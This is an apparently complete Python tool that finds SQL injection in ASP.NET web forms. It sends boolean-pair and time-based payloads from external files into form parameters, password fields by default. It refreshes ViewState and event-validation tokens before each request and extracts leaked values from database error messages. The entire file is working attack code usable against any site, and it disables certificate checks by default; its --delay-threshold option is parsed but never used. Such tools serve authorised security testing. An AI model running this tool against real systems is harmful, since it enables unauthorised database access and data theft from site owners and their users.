#!/usr/bin/env python3
"""
aspnet_sqli.py — ASP.NET SQL Injection Tester
Boolean-pair + time-based differential analysis.
Accepts multiple payload files or a directory of payload files.
Auto-skips JSON-valued params (DevExpress, state fields).

Usage:
    # Single request, pairs payload file
    python3 aspnet_sqli.py -r req.txt -p mssql_pairs.txt

    # Multiple payload files
    python3 aspnet_sqli.py -r req.txt -p mssql_pairs.txt,mssql_timebased.txt

    # Entire payload directory
    python3 aspnet_sqli.py -r req.txt -p payloads/

    # Burp XML, rotate all params, all payload files in directory
    python3 aspnet_sqli.py -x burp.xml -p payloads/ --rotate-params
"""

import argparse, base64, glob, html as htmlmod, os, re, sys, time
import urllib.parse, xml.etree.ElementTree as ET
from dataclasses import dataclass
from typing import Optional
from collections import defaultdict
import requests, urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── Colours ───────────────────────────────────────────────────────────────────
class C:
    RED="\033[91m"; GREEN="\033[92m"; YELLOW="\033[93m"
    CYAN="\033[96m"; BOLD="\033[1m"; RESET="\033[0m"

def red(s):    return f"{C.RED}{s}{C.RESET}"
def green(s):  return f"{C.GREEN}{s}{C.RESET}"
def yellow(s): return f"{C.YELLOW}{s}{C.RESET}"
def cyan(s):   return f"{C.CYAN}{s}{C.RESET}"
def bold(s):   return f"{C.BOLD}{s}{C.RESET}"

# ── Constants ─────────────────────────────────────────────────────────────────
DEFAULT_TOKEN_FIELDS = [
    "__VIEWSTATE","__EVENTVALIDATION","__VIEWSTATEGENERATOR",
    "__EVENTTARGET","__EVENTARGUMENT",
]
SKIP_PARAM_SUFFIXES = ("$ctl08","$Button","$Submit","$LoginButton")

# Params whose values look like JSON or DevExpress state — never inject into
JSON_VALUE_PATTERNS = [
    re.compile(r'^\s*\{'),          # starts with {
    re.compile(r'^\s*\['),          # starts with [
    re.compile(r'"validationState"'),
    re.compile(r'^\d+_\d+'),        # DXScript format: 1_230,1_168
]

# ── Payload parsing ───────────────────────────────────────────────────────────
@dataclass
class PayloadPair:
    true_payload:  str
    false_payload: Optional[str] = None
    label:         str = ""
    is_timebased:  bool = False   # True if payload contains WAITFOR/SLEEP

    @property
    def is_pair(self):
        return self.false_payload is not None

    @property
    def length_matched(self):
        return self.is_pair and len(self.true_payload) == len(self.false_payload)

    def __post_init__(self):
        tb_pattern = re.compile(r'WAITFOR\s+DELAY|SLEEP\s*\(', re.I)
        self.is_timebased = bool(
            tb_pattern.search(self.true_payload) or
            (self.false_payload and tb_pattern.search(self.false_payload))
        )


def parse_payload_file(path: str) -> list[PayloadPair]:
    pairs, pending_true, pending_label = [], None, ""
    with open(path) as f:
        for raw in f:
            line = raw.strip()
            if not line or line.startswith("#"):
                if line.startswith("# ──") or line.startswith("# =="):
                    pending_label = line.lstrip("# ─=").strip()
                continue
            if line.upper().startswith("TRUE:"):
                pending_true = line[5:].strip()
            elif line.upper().startswith("FALSE:") and pending_true is not None:
                pairs.append(PayloadPair(pending_true, line[6:].strip(), pending_label))
                pending_true = pending_label = ""
            else:
                if pending_true:
                    pairs.append(PayloadPair(pending_true, label=pending_label))
                    pending_true = ""
                pairs.append(PayloadPair(line, label=pending_label))
    if pending_true:
        pairs.append(PayloadPair(pending_true))
    return pairs


def load_payload_sources(source: str) -> list[tuple[str, list[PayloadPair]]]:
    """
    Accept comma-separated files, a directory, or a single file.
    Returns list of (filename, pairs).
    """
    results = []
    sources = [s.strip() for s in source.split(",")]
    paths = []
    for s in sources:
        if os.path.isdir(s):
            paths.extend(sorted(glob.glob(os.path.join(s, "*.txt"))))
        elif os.path.isfile(s):
            paths.append(s)
        else:
            print(yellow(f"  [!] Payload source not found: {s}"))
    for path in paths:
        pairs = parse_payload_file(path)
        if pairs:
            results.append((os.path.basename(path), pairs))
    return results


def validate_pairs(fname: str, pairs: list[PayloadPair]):
    mis = [p for p in pairs if p.is_pair and not p.length_matched]
    lt  = [p for p in pairs if p.is_pair and p.false_payload and "<" in p.false_payload]
    if mis:
        print(yellow(f"  [!] {fname}: {len(mis)} length-mismatched pair(s)"))
        for p in mis:
            print(yellow(f"      T({len(p.true_payload)}): {p.true_payload[:60]}"))
            print(yellow(f"      F({len(p.false_payload)}): {p.false_payload[:60]}"))
    if lt:
        print(red(f"  [!] {fname}: {len(lt)} FALSE payload(s) contain '<' — HTML-encoding FP risk"))
        print(red(f"      Replace 'x<y' with 'x=y' or 'x>999' to avoid fake 3-byte deltas"))

# ── Request parsing ───────────────────────────────────────────────────────────
@dataclass
class ParsedRequest:
    method: str; path: str; host: str; scheme: str
    headers: dict; cookies: dict; body: str; params: dict; label: str = ""

def full_url(r): return f"{r.scheme}://{r.host}{r.path}"

def _parse_raw(raw: str, scheme="https", label="") -> ParsedRequest:
    raw = raw.replace("\r\n","\n").replace("\r","\n")
    head, body = (raw.split("\n\n",1)+[""])[:2]
    lines = head.splitlines()
    parts = lines[0].strip().split()
    method = parts[0].upper() if parts else "GET"
    path   = parts[1] if len(parts)>1 else "/"
    headers = {}
    for ln in lines[1:]:
        if ":" in ln:
            k,v = ln.split(":",1); headers[k.strip()] = v.strip()
    host = headers.pop("Host","")
    cookies = {}
    for part in headers.pop("Cookie","").split(";"):
        part = part.strip()
        if "=" in part:
            k,v = part.split("=",1); cookies[k.strip()] = v.strip()
    for a in ("Content-Length","Content-Type","Connection","Accept-Encoding"):
        headers.pop(a,None)
    body = body.strip()
    params = {}
    if body:
        for kv in body.split("&"):
            if "=" in kv:
                k,v = kv.split("=",1)
                params[urllib.parse.unquote_plus(k)] = urllib.parse.unquote_plus(v)
            else:
                params[urllib.parse.unquote_plus(kv)] = ""
    return ParsedRequest(method=method, path=path, host=host, scheme=scheme,
                         headers=headers, cookies=cookies, body=body,
                         params=params, label=label or path)

def parse_request_file(path, scheme="https"):
    with open(path,"rb") as f:
        return _parse_raw(f.read().decode("utf-8","replace"), scheme=scheme, label=path)

def parse_burp_xml(xml_path, methods=None, min_params=1):
    methods = [m.upper() for m in (methods or ["POST","PUT","PATCH"])]
    try: tree = ET.parse(xml_path)
    except ET.ParseError as e:
        print(red(f"[!] XML parse error: {e}")); sys.exit(1)
    root = tree.getroot()
    items = root.findall("item")
    print(f"[*] Burp XML: {len(items)} items in {xml_path}")
    results = []
    for i,item in enumerate(items,1):
        method   = (item.findtext("method") or "").upper()
        protocol = (item.findtext("protocol") or "https").lower()
        host     = (item.findtext("host") or "")
        path     = (item.findtext("path") or "/")
        if method not in methods: continue
        req_el = item.find("request")
        if req_el is None or not req_el.text: continue
        raw = req_el.text.strip()
        if req_el.get("base64") == "true":
            try: raw = base64.b64decode(raw).decode("utf-8","replace")
            except: continue
        label = f"item#{i} {method} {host}{path}"
        req = _parse_raw(raw, scheme=protocol, label=label)
        if not req.host: req.host = host; req.scheme = protocol
        if len(req.params) < min_params: continue
        results.append(req)
    print(f"[*] {len(results)} {'/'.join(methods)} requests with ≥{min_params} params\n")
    return results

# ── Token handling ────────────────────────────────────────────────────────────
def extract_tokens(html_text, token_fields):
    tokens = {}
    for f in token_fields:
        for pat in [
            rf'<input[^>]+name=["\']?{re.escape(f)}["\']?[^>]+value=["\']([^"\']*)["\']',
            rf'<input[^>]+value=["\']([^"\']*)["\'][^>]+name=["\']?{re.escape(f)}["\']?',
        ]:
            m = re.search(pat, html_text, re.IGNORECASE)
            if m: tokens[f] = m.group(1); break
    return tokens

def get_fresh_tokens(session, req, token_fields, timeout, verify):
    if not token_fields: return {}
    try:
        r = session.get(full_url(req), headers=req.headers,
                        timeout=timeout, verify=verify, allow_redirects=True)
        return extract_tokens(r.text, token_fields)
    except requests.RequestException as e:
        print(red(f"[!] Token refresh: {e}")); return None

# ── Injectable param discovery ────────────────────────────────────────────────
def is_json_param(name: str, value: str) -> bool:
    """Return True if param appears to carry JSON or DevExpress state."""
    for pat in JSON_VALUE_PATTERNS:
        if pat.search(value): return True
    # Also skip params whose name ends in $State or $TB$State
    if name.endswith("$State") or name.endswith("TB$State"):
        return True
    return False

def get_injectable_params(req, token_fields, extra_skip=None):
    skip = set(token_fields) | set(extra_skip or [])
    out  = []
    for name, value in req.params.items():
        if name in skip: continue
        if any(name.endswith(s) for s in SKIP_PARAM_SUFFIXES): continue
        if name.startswith("DX"): continue
        if is_json_param(name, value):
            print(yellow(f"    [skip] {name} — JSON/DevExpress state value"))
            continue
        out.append(name)
    return out

# ── Request builder ───────────────────────────────────────────────────────────
def build_body(base, inject_param, payload, mirror=None, overrides=None):
    p = dict(base)
    if overrides: p.update(overrides)
    p[inject_param] = payload
    if mirror and mirror in p: p[mirror] = payload
    return p

# ── Hint extraction ───────────────────────────────────────────────────────────
def extract_hint(body):
    d = htmlmod.unescape(body)
    checks = [
        (r"Conversion failed when converting (?:the )?(?:nvarchar|varchar|"
         r"uniqueidentifier|datetime|ntext|text) value '([^']{1,500})' to data type",
         lambda m: f"EXTRACTED(MSSQL): {m.group(1)}"),
        (r"XPATH syntax error: '([^']{1,300})'",
         lambda m: f"EXTRACTED(MySQL): {m.group(1)}"),
        (r"(ORA-\d{4,5}[^\n<]{0,150})", lambda m: m.group(1).strip()),
        (r"A potentially dangerous Request\.Form value",
         lambda m: "[RequestValidation — CHAR-encode payload]"),
        (r"(Incorrect syntax near|Unclosed quotation mark|"
         r"arithmetic overflow|Invalid column name|Invalid object name|"
         r"You have an error in your SQL syntax)[^\n<]{0,200}",
         lambda m: m.group(0).strip()),
        (r"(SqlException|OleDbException)[^\n<]{0,120}",
         lambda m: f"[noise] {m.group(0).strip()}"),
    ]
    for pat, fmt in checks:
        m = re.search(pat, d, re.IGNORECASE)
        if m: return fmt(m)
    return ""

# ── Single HTTP request ───────────────────────────────────────────────────────
def do_request(session, req, params, timeout, verify):
    try:
        t0 = time.time()
        r  = session.request(method=req.method, url=full_url(req),
                             headers=req.headers, data=params,
                             timeout=timeout, verify=verify, allow_redirects=False)
        ms   = int((time.time()-t0)*1000)
        hint = extract_hint(r.text) if r.status_code >= 400 else ""
        return r.status_code, len(r.content), ms, hint, r.text
    except requests.Timeout:
        return 0, 0, timeout*1000, "TIMEOUT", ""
    except requests.RequestException as e:
        return 0, 0, 0, str(e), ""

# ── Baseline ──────────────────────────────────────────────────────────────────
def confirm_baseline(session, req, token_fields, baseline_string, timeout, verify):
    tokens = get_fresh_tokens(session, req, token_fields, timeout, verify)
    if tokens is None: return None
    params = {**req.params, **tokens}
    try:
        t0 = time.time()
        r  = session.request(method=req.method, url=full_url(req),
                             headers=req.headers, data=params,
                             timeout=timeout, verify=verify, allow_redirects=False)
        ms = int((time.time()-t0)*1000)
    except requests.RequestException as e:
        print(red(f"    [!] Baseline failed: {e}")); return None
    sc = r.status_code; sz = len(r.content)
    s  = green(str(sc)) if sc < 400 else red(str(sc))
    print(f"    Status:{s}  Size:{sz}b  Time:{ms}ms")
    if sc >= 500:
        print(red("    [!] Baseline 500 — cookies likely expired.")); return None
    if baseline_string and baseline_string not in r.text:
        print(yellow(f"    [!] '{baseline_string}' not in response.")); return None
    print(green("    [+] Baseline confirmed."))
    return sc, sz, ms   # return ms for time-based baseline

# ── Pair result ───────────────────────────────────────────────────────────────
@dataclass
class PairResult:
    pair:       PayloadPair
    true_sc:    int; true_sz: int; true_ms: int; true_hint: str = ""
    false_sc:   int = 0; false_sz: int = 0; false_ms: int = 0; false_hint: str = ""
    baseline_ms: int = 0
    delay_threshold: int = 3000   # ms above baseline to count as delayed

    @property
    def confirmed(self):
        if not self.pair.is_pair:
            return False
        if self.pair.is_timebased:
            # TRUE should be delayed, FALSE should not
            true_delayed  = self.true_ms  > (self.baseline_ms + self.delay_threshold)
            false_delayed = self.false_ms > (self.baseline_ms + self.delay_threshold)
            return true_delayed and not false_delayed
        return (self.true_sc != self.false_sc or self.true_sz != self.false_sz)

    @property
    def deviation_type(self):
        if not self.pair.is_pair: return "single"
        if self.pair.is_timebased:
            return (f"time(TRUE:{self.true_ms}ms FALSE:{self.false_ms}ms "
                    f"baseline:{self.baseline_ms}ms)")
        if self.true_sc != self.false_sc:
            return f"status({self.true_sc}≠{self.false_sc})"
        delta = self.true_sz - self.false_sz
        return f"size(Δ{delta:+d}b)"


def run_pair(session, req, pair, inject_param, baseline_sc, baseline_sz,
             baseline_ms, token_fields, mirror, overrides,
             timeout, verify, delay) -> PairResult:
    # TRUE
    tokens = get_fresh_tokens(session, req, token_fields, timeout, verify) or {}
    params = build_body(req.params, inject_param, pair.true_payload,
                        mirror=mirror, overrides=overrides)
    params.update(tokens)
    t_sc, t_sz, t_ms, t_hint, _ = do_request(session, req, params, timeout, verify)
    time.sleep(delay)

    result = PairResult(pair=pair, true_sc=t_sc, true_sz=t_sz,
                        true_ms=t_ms, true_hint=t_hint,
                        baseline_ms=baseline_ms)

    if not pair.is_pair: return result

    # FALSE
    tokens = get_fresh_tokens(session, req, token_fields, timeout, verify) or {}
    params = build_body(req.params, inject_param, pair.false_payload,
                        mirror=mirror, overrides=overrides)
    params.update(tokens)
    f_sc, f_sz, f_ms, f_hint, _ = do_request(session, req, params, timeout, verify)
    time.sleep(delay)

    result.false_sc = f_sc; result.false_sz = f_sz
    result.false_ms = f_ms; result.false_hint = f_hint
    return result

# ── Payload loop (one param, one payload file) ────────────────────────────────
def run_param_file(session, req, fname, pairs, inject_param,
                   baseline_sc, baseline_sz, baseline_ms,
                   token_fields, mirror, overrides, args) -> list[dict]:

    n_pairs   = sum(1 for p in pairs if p.is_pair)
    n_singles = len(pairs) - n_pairs
    n_tb      = sum(1 for p in pairs if p.is_timebased)
    print(bold(f"\n    [{fname}] {n_pairs} pairs ({n_tb} time-based) + {n_singles} singles"))
    print(f"\n    {'#':<4} TRUE sc/sz/ms      FALSE sc/sz/ms     Match?               Payload")
    print(f"    {'─'*95}")

    confirmed = []
    singles   = []

    for i, pair in enumerate(pairs, 1):
        result = run_pair(session, req, pair, inject_param,
                          baseline_sc, baseline_sz, baseline_ms,
                          token_fields, mirror, overrides,
                          args.timeout, args.verify, args.delay)

        t_s = (green if result.true_sc < 400 else red)(str(result.true_sc))
        f_s = (green if result.false_sc < 400 else red)(str(result.false_sc)) \
              if pair.is_pair else "-"

        if pair.is_pair:
            if result.confirmed:
                match_s = red(f"CONFIRMED {result.deviation_type}")
            elif not pair.length_matched and not pair.is_timebased:
                match_s = yellow("same (len≠)")
            else:
                match_s = green("same ✓")
        else:
            dev = (result.true_sc != baseline_sc or result.true_sz != baseline_sz)
            match_s = yellow("deviate") if dev else green("clean")

        display = (pair.true_payload[:42]+"…") if len(pair.true_payload)>42 else pair.true_payload
        tb_mark = "⏱" if pair.is_timebased else " "

        print(f"    {i:<4}{tb_mark}{t_s} {result.true_sz:<6} {result.true_ms:<6}"
              f"  {f_s} {result.false_sz if pair.is_pair else '-':<6} "
              f"{result.false_ms if pair.is_pair else '-':<6}"
              f"  {match_s:<28} {display}")

        if result.true_hint:  print(f"         {yellow('└T '+result.true_hint)}")
        if result.false_hint: print(f"         {yellow('└F '+result.false_hint)}")

        if result.confirmed:
            confirmed.append({
                "url": full_url(req), "label": req.label,
                "param": inject_param, "file": fname,
                "pair_n": i, "timebased": pair.is_timebased,
                "true_payload": pair.true_payload,
                "false_payload": pair.false_payload,
                "true_sc": result.true_sc, "true_sz": result.true_sz,
                "true_ms": result.true_ms,
                "false_sc": result.false_sc, "false_sz": result.false_sz,
                "false_ms": result.false_ms,
                "deviation": result.deviation_type,
                "hint": result.true_hint or result.false_hint,
                "confirmed": True,
            })
        elif not pair.is_pair:
            dev = (result.true_sc != baseline_sc or result.true_sz != baseline_sz)
            if dev:
                singles.append({
                    "url": full_url(req), "label": req.label,
                    "param": inject_param, "file": fname,
                    "pair_n": i, "timebased": pair.is_timebased,
                    "true_payload": pair.true_payload, "false_payload": None,
                    "true_sc": result.true_sc, "true_sz": result.true_sz,
                    "true_ms": result.true_ms,
                    "deviation": f"vs baseline({baseline_sc}/{baseline_sz}b/{baseline_ms}ms)",
                    "hint": result.true_hint, "confirmed": False,
                })

    c = len(confirmed); s = len(singles)
    print(f"\n    → {c} confirmed" + (f", {s} single deviations" if s else ""))
    return confirmed + singles


# ── Test one param across all payload files ───────────────────────────────────
def run_param(session, req, payload_sources, inject_param,
              baseline_sc, baseline_sz, baseline_ms,
              token_fields, mirror, overrides, args) -> list[dict]:

    # Auto-detect mirror for ConfirmPassword
    m = mirror
    if args.rotate_params and "Password" in inject_param and not m:
        for k in req.params:
            if "Confirm" in k and "Password" in k: m = k; break

    print(bold(f"\n  ▶ {inject_param}"+(f" → mirror:{m}" if m else "")))

    all_findings = []
    for fname, pairs in payload_sources:
        findings = run_param_file(session, req, fname, pairs, inject_param,
                                  baseline_sc, baseline_sz, baseline_ms,
                                  token_fields, m, overrides, args)
        all_findings.extend(findings)
    return all_findings


# ── Test one request ──────────────────────────────────────────────────────────
def test_request(session, req, payload_sources, args,
                 token_fields, overrides) -> list[dict]:
    print(bold(f"\n{'═'*95}"))
    print(bold(f"  {req.method} {full_url(req)}"))
    print(bold(f"  {req.label}"))
    print(bold(f"{'═'*95}"))

    if args.rotate_params:
        inject_params = get_injectable_params(req, token_fields,
                                              extra_skip=args.skip_param)
        if not inject_params:
            print(yellow("  [!] No injectable params after filtering — skipping"))
            return []
        print(f"  Params : {inject_params}")
    else:
        inject_params = [args.inject_param]
        if args.inject_param not in req.params:
            print(yellow(f"  [!] '{args.inject_param}' not in params — skipping"))
            print(yellow(f"  [!] Available: {list(req.params.keys())}"))
            return []

    print(bold("\n  [*] Baseline..."))
    bl = confirm_baseline(session, req, token_fields,
                          args.baseline_string, args.timeout, args.verify)
    if not bl:
        print(yellow("  [!] Baseline failed — skipping")); return []
    bl_sc, bl_sz, bl_ms = bl

    all_findings = []
    for inject_param in inject_params:
        findings = run_param(session, req, payload_sources, inject_param,
                             bl_sc, bl_sz, bl_ms, token_fields,
                             args.mirror_param, overrides, args)
        all_findings.extend(findings)
    return all_findings


# ── Summary ───────────────────────────────────────────────────────────────────
def print_summary(all_findings, total_requests):
    confirmed = [f for f in all_findings if f["confirmed"]]
    singles   = [f for f in all_findings if not f["confirmed"]]
    tb_conf   = [f for f in confirmed if f.get("timebased")]

    print(bold(f"\n\n{'█'*95}"))
    print(bold(f"  SUMMARY — {total_requests} request(s) | "
               f"{len(confirmed)} confirmed ({len(tb_conf)} time-based) | "
               f"{len(singles)} unconfirmed"))
    print(bold(f"{'█'*95}\n"))

    if confirmed:
        grouped = defaultdict(list)
        for f in confirmed:
            grouped[(f["url"], f["param"])].append(f)
        print(bold(red(f"  ✔ CONFIRMED ({len(grouped)} injection point(s)):\n")))
        for (url, param), findings in grouped.items():
            by_file = defaultdict(list)
            for f in findings: by_file[f["file"]].append(f)
            print(bold(f"  ┌─ {url}"))
            print(f"  │  Parameter : {param}")
            for fname, flist in by_file.items():
                tb = sum(1 for f in flist if f.get("timebased"))
                print(f"  │  [{fname}] {len(flist)} hit(s)"
                      + (f" ({tb} time-based)" if tb else ""))
                for f in flist[:2]:
                    tb_mark = " ⏱" if f.get("timebased") else ""
                    print(f"  │    Pair #{f['pair_n']}{tb_mark}: {f['deviation']}")
                    print(f"  │      TRUE : {f['true_payload'][:75]}")
                    print(f"  │      FALSE: {f['false_payload'][:75]}")
                    if f["hint"]:
                        print(f"  │      Hint : {f['hint']}")
                if len(flist) > 2:
                    print(f"  │      ... and {len(flist)-2} more")
            print(f"  └{'─'*60}\n")
    else:
        print(green("  [+] No confirmed injection points.\n"))

    if singles:
        print(yellow(f"  ⚠ UNCONFIRMED SINGLES ({len(singles)}) — add FALSE payloads:\n"))
        for f in singles:
            print(f"  ┌─ {f['url']}  [{f['file']}]")
            print(f"  │  Param  : {f['param']}")
            print(f"  │  Payload: {f['true_payload'][:80]}")
            print(f"  │  Delta  : {f['deviation']}")
            if f["hint"]: print(f"  │  Hint  : {f['hint']}")
            print(f"  └{'─'*60}")


# ── Main ──────────────────────────────────────────────────────────────────────
def run(args):
    proxy   = None if args.no_proxy else args.proxy
    proxies = {"http": proxy, "https": proxy} if proxy else {}
    scheme  = "http" if args.http else "https"
    token_fields = [t.strip() for t in args.token_fields.split(",")
                    if t.strip()] if args.token_fields else DEFAULT_TOKEN_FIELDS

    overrides = {}
    for kv in args.set_param:
        if "=" in kv: k,v = kv.split("=",1); overrides[k] = v

    print(bold(cyan("\n=== aspnet_sqli.py (boolean + time-based) ===")))
    print(f"  Proxy   : {proxy or 'direct'}")
    print(f"  Tokens  : {token_fields or 'none'}")
    print(f"  Rotate  : {args.rotate_params}")

    payload_sources = load_payload_sources(args.payloads)
    if not payload_sources:
        print(red("[!] No payload files loaded.")); sys.exit(1)

    total_pairs = sum(sum(1 for p in pairs if p.is_pair)
                      for _,pairs in payload_sources)
    total_singles = sum(sum(1 for p in pairs if not p.is_pair)
                        for _,pairs in payload_sources)
    total_tb = sum(sum(1 for p in pairs if p.is_timebased)
                   for _,pairs in payload_sources)
    print(f"  Payloads: {total_pairs} pairs ({total_tb} time-based) + "
          f"{total_singles} singles from {len(payload_sources)} file(s)")

    for fname, pairs in payload_sources:
        validate_pairs(fname, pairs)

    session = requests.Session()
    session.proxies.update(proxies)

    if args.burp_xml:
        test_requests = parse_burp_xml(
            args.burp_xml,
            methods=args.xml_methods.upper().split(","),
            min_params=args.min_params)
        if args.cookies:
            for part in args.cookies.split(";"):
                if "=" in part:
                    k,v = part.strip().split("=",1)
                    session.cookies.set(k.strip(), v.strip())
    else:
        req = parse_request_file(args.request, scheme=scheme)
        session.cookies.update(req.cookies)
        test_requests = [req]

    if not test_requests:
        print(red("[!] No requests to test.")); sys.exit(1)

    print(f"\n[*] Testing {len(test_requests)} request(s)\n")

    all_findings = []
    for req in test_requests:
        if not args.burp_xml:
            session.cookies.clear()
            session.cookies.update(req.cookies)
        findings = test_request(session, req, payload_sources, args,
                                token_fields, overrides)
        all_findings.extend(findings)

    print_summary(all_findings, len(test_requests))


# ── CLI ───────────────────────────────────────────────────────────────────────
def main():
    ap = argparse.ArgumentParser(
        description="ASP.NET SQLi tester — boolean-pair + time-based",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Payload sources (-p) accept:
  Single file:    -p mssql_pairs.txt
  Multiple files: -p mssql_pairs.txt,mssql_timebased.txt
  Directory:      -p payloads/          (loads all *.txt in dir)

Examples:
  python3 aspnet_sqli.py -r req.txt -p payloads/
  python3 aspnet_sqli.py -r req.txt -p mssql_pairs.txt,mssql_timebased.txt
  python3 aspnet_sqli.py -x burp.xml -p payloads/ --rotate-params
  python3 aspnet_sqli.py -r req.txt -p payloads/ \\
      --inject-param 'ctl00$contentholder$loginForm$UserName'
        """
    )
    src = ap.add_mutually_exclusive_group(required=True)
    src.add_argument("-r","--request",  help="Raw HTTP request file")
    src.add_argument("-x","--burp-xml", help="Burp Suite XML export")
    ap.add_argument("-p","--payloads", required=True,
                    help="Payload file, comma-separated files, or directory of .txt files")
    ap.add_argument("--inject-param",  default="ctl00$MainContent$Password")
    ap.add_argument("--rotate-params", action="store_true")
    ap.add_argument("--skip-param",    metavar="PARAM", action="append", default=[])
    ap.add_argument("--mirror-param",  default=None)
    ap.add_argument("--set-param",     metavar="KEY=VALUE", action="append", default=[])
    ap.add_argument("--baseline-string", default="")
    ap.add_argument("--token-fields",  default=",".join(DEFAULT_TOKEN_FIELDS))
    ap.add_argument("--xml-methods",   default="POST,PUT,PATCH")
    ap.add_argument("--min-params",    type=int, default=1)
    ap.add_argument("--cookies",       default="")
    ap.add_argument("--proxy",         default="http://127.0.0.1:8080")
    ap.add_argument("--no-proxy",      action="store_true")
    ap.add_argument("--http",          action="store_true")
    ap.add_argument("--verify",        action="store_true")
    ap.add_argument("--timeout",       type=int,   default=90)
    ap.add_argument("--delay",         type=float, default=0.5)
    ap.add_argument("--delay-threshold", type=int, default=3000,
                    help="ms above baseline to confirm time-based injection (default: 3000)")
    args = ap.parse_args()
    run(args)

if __name__ == "__main__":
    main()
